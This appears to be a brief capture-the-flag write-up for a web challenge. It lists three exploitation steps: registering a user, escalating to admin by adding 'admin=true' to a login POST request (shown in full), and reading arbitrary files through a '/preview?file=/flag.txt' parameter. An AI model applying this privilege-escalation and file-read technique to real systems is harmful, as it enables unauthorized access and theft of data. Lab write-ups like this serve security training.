## Exploitation Steps

1. **Register a normal user account**  
   Send a POST request to `/register` with a chosen username and password.

2. **Login with privilege escalation**  
   Send a POST request to `/login` with your username, password, and `admin=true`:

       POST /login HTTP/1.1
       Content-Type: application/x-www-form-urlencoded

       username=test&password=pass123&admin=true

3. **Read arbitrary files**  
   As an admin, visit:

       /preview?file=/flag.txt

   to retrieve the flag.
